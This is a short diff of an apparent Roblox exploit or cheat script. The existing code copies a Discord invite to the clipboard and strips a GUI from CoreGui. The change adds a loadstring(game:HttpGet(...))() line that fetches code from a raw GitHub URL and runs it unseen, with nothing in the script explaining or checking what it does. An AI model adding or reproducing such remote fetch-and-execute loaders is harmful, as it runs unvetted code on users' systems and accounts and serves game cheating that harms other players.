@@ -59,6 +59,10 @@ Players.PlayerAdded:Connect(function(CKP)
 end)
 
 setclipboard("https://discord.gg/tKFzvZysff")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/page3/main/Misc",true))()
+wait()
+
 for i,v in pairs(game.CoreGui:GetChildren()) do
     if v.Name == 'NinjaGui' then
         v:Remove()
